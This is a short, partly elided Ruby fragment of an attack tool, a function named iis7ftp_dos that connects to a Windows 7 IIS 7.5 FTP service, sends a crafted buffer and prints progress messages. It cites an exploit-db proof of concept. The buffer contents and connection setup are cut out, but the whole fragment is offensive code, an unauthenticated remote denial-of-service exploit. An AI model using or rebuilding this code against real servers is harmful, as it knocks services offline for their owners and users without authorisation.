...
def iis7ftp_dos(opt)
	# Windows 7 IIS7.5 FTPSVC UNAUTH'D DoS
	# Based on Windows 7 IIS7.5 FTPSVC UNAUTH'D Remote DoS PoC http://www.exploit-db.com/exploits/15803/
	buff =
	...
	begin
		...
		puts "#{HC}#{FYEL}Connection failed......"
		return 0
	end
	puts "#{HC}#{FYEL}Connected....! waiting for FTP  ..."
	s.recv(1000)
	puts "#{HC}#{FYEL}Exploit sending ..."
	s.write(buff + "\r\n")
	s.close()
	puts "#{HC}#{FYEL}Done !....."
end
